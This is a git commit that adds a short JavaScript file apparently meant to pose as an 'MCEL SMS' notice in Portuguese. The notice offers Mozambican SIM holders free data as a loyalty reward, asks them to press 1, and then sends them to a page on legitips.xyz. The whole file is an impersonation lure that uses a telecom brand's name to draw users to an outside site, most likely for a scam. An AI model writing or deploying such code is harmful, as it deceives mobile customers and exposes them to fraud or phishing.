a37e707354eb63a4e57c222e93737ec08456e318
legitips <83867893+legitips@users.noreply.github.com>
2024-07-02 12:41:09 -0700

    Create activation-mcel-mz.js

---
+++ activation-mcel-mz.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('MCEL SMS: Prezado cliente, por favor, verifique se o seu cartão SIM MCEL está qualificado para receber dados gratuitos, recompensa de clientes antigos, pressione 1 para verificar agora ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/mcel-mz';
+}
